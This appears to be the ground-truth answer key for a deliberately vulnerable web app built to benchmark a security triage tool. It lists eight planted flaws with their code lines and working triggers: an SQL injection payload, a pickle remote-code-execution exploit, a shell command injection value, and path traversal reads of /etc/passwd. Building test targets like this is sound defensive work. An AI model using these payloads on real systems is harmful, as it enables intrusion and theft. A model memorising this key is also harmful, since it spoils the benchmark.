# VULNERABILITIES.md — Ground Truth

This file is the **ground truth** for the ShopFast test target
(`test-target-repo/`). Every vulnerability below is intentionally planted,
reachable over HTTP, and will be used to measure CodeSage's triage accuracy
(precision/recall) in later modules.

| ID  | Vulnerability                | CWE      | Severity | Location (file:line)              | Endpoint |
|-----|------------------------------|----------|----------|-----------------------------------|----------|
| V1  | SQL Injection                | CWE-89   | critical | shop.py:17                        | `GET /products/search` |
| V2  | Hardcoded API Key            | CWE-798  | high     | payments.py:10                    | (used by `POST /payments/checkout`) |
| V3  | Plaintext Password Auth      | CWE-259  | high     | auth.py:11, auth.py:25            | `POST /login` |
| V4  | Insecure Deserialization    | CWE-502  | critical | tasks.py:21                       | `POST /tasks/import` |
| V5  | Path Traversal               | CWE-22   | high     | files.py:16                       | `GET /files/read` |
| V6  | Command Injection            | CWE-78   | critical | admin.py:14                       | `GET /admin/diagnostics` |
| V7  | Insecure CORS Configuration | CWE-942  | medium   | main.py:34                        | (middleware, all endpoints) |
| V8  | Vulnerable Dependencies     | CWE-1104 | medium   | requirements.txt:9-10             | (supply chain, all endpoints) |

All examples assume the server is running on `http://127.0.0.1:8000`.

---

## V1 — SQL Injection (CWE-89)

**Where:** `shop.py:17` — `GET /products/search?q=...`

The query parameter is interpolated directly into a SQL string:

```python
query = f"SELECT * FROM products WHERE name LIKE '%{q}%'"
```

**Trigger:** a tautology payload makes the `WHERE` clause always true, so every
product row is returned instead of the matching ones:

```bash
curl -G "http://127.0.0.1:8000/products/search" --data-urlencode "q=' OR 1=1 --"
```

**Verify:** searching `phone` returns 1 result; the payload above returns all 5
seeded products. `UNION`/stacked payloads work the same way.

---

## V2 — Hardcoded API Key (CWE-798)

**Where:** `payments.py:10` — referenced by `POST /payments/checkout`

```python
STRIPE_API_KEY = "STRIPE_TEST_KEY_PLACEHOLDER"
```

A fake test payment provider secret placeholder committed to source, sent as a Bearer
token on every checkout call. This demonstrates the hardcoded credential pattern
flagged by security and secret scanners (e.g. Semgrep, Gitleaks).

**Trigger:** no request needed to detect it — read the source:

```bash
grep -n "STRIPE_TEST_KEY_PLACEHOLDER" payments.py
```

---

## V3 — Plaintext Password Authentication (CWE-259)

**Where:** `auth.py:11` (plaintext credential store), `auth.py:25` (plaintext
`==` comparison) — `POST /login`

Credentials live in a source-level dict in cleartext and are compared with
`==`. The issued "token" is just `base64(username:password)`, so credentials
round-trip through every request.

**Trigger:**

```bash
curl -s -X POST http://127.0.0.1:8000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "alice", "password": "wonderland123"}'
```

**Verify:** the response's `access_token` base64-decodes to
`alice:wonderland123`. Any password hashing/bcrypt/argon2 is absent.

---

## V4 — Insecure Deserialization (CWE-502)

**Where:** `tasks.py:21` — `POST /tasks/import`

The `data` field is base64-decoded and passed straight to `pickle.loads()`.
Unpickling attacker-controlled bytes executes arbitrary Python code via the
pickle VM (`__reduce__`).

**Trigger (safe, local proof — writes a marker file next to the app):**

```python
# run anywhere with python3, then paste the base64 output into the request
import base64, os, pickle

class Exploit:
    def __reduce__(self):
        return (os.system, ("touch ./pwned_by_v4.txt",))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

```bash
curl -s -X POST http://127.0.0.1:8000/tasks/import \
  -H "Content-Type: application/json" \
  -d '{"data": "<BASE64_FROM_ABOVE>"}'
```

**Verify:** `pwned_by_v4.txt` appears in `test-target-repo/` — arbitrary code
executed on the server. (Safe round-trip payloads also import fine.)

---

## V5 — Path Traversal (CWE-22)

**Where:** `files.py:16` — `GET /files/read?path=...`

`path` is joined onto the docs directory with no validation or canonicalization:

```python
full_path = os.path.join(DOCS_DIR, path)
```

`../` sequences escape the docs folder, and an absolute path replaces it
entirely (`os.path.join` semantics).

**Trigger:**

```bash
# reads application source outside docs/
curl -s "http://127.0.0.1:8000/files/read?path=../payments.py"

# absolute path fully overrides the base directory
curl -s "http://127.0.0.1:8000/files/read?path=/etc/passwd"
```

**Verify:** the first call returns the contents of `payments.py`
(`STRIPE_API_KEY` is visible in the response).

---

## V6 — Command Injection (CWE-78)

**Where:** `admin.py:14` — `GET /admin/diagnostics?host=...`

The host parameter is interpolated into a shell command run with `os.system`,
so shell metacharacters chain arbitrary commands:

```python
exit_status = os.system(f"ping -c 1 {host}")
```

**Trigger (safe, local proof — writes a marker file next to the app):**

```bash
curl -s -G "http://127.0.0.1:8000/admin/diagnostics" \
  --data-urlencode "host=127.0.0.1; touch ./pwned_by_v6.txt"
```

**Verify:** `pwned_by_v6.txt` appears in `test-target-repo/`. Equivalent
payloads with `&&`, `|`, or backticks work the same way.

---

## V7 — Insecure CORS Configuration (CWE-942)

**Where:** `main.py:34` — middleware applies to every endpoint

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    ...
)
```

Any origin may make cross-site requests and (because credentials are allowed)
read authenticated responses — e.g. a victim's browser session at this app.

**Trigger:**

```bash
curl -s -D - -o /dev/null http://127.0.0.1:8000/health \
  -H "Origin: https://evil.example"
```

**Verify:** the response carries `access-control-allow-origin` for the
attacker origin (echoed, with `access-control-allow-credentials: true`).

---

## V8 — Vulnerable Pinned Dependencies (CWE-1104)

**Where:** `requirements.txt:9-10`

| Package   | Pin      | Known CVE(s)                                        | Fixed in |
|-----------|----------|------------------------------------------------------|----------|
| PyYAML    | 5.3.1    | CVE-2020-14343 (FullLoader bypass → code exec)      | 5.4      |
| requests  | 2.25.1   | CVE-2023-32681, CVE-2024-35195, CVE-2024-47081      | 2.31.0 / 2.32.4 |

Both are real runtime imports (`config.py`, `payments.py`), not filler pins,
so `pip install -r requirements.txt` reproduces the vulnerable environment.
Note the app itself calls `yaml.safe_load` and `requests.post` safely — the
flaw here is the outdated, CVE-affected versions, exactly what dependency
scanners (pip-audit / safety / Dependabot-style tooling) flag.

**Trigger:** dependency scanners (pip-audit / safety / `dependabot`-style
tools) flag both pins; no request needed.

```bash
pip-audit -r requirements.txt   # if installed
```

---

## Seeding & baseline

- The SQLite catalog is seeded with 5 products on every startup
  (`database.py`), so V1's row-count verification is deterministic.
- `pytest -v` runs both functional tests and one test per planted
  vulnerability (V1–V8); all must pass for this target to be a valid benchmark.
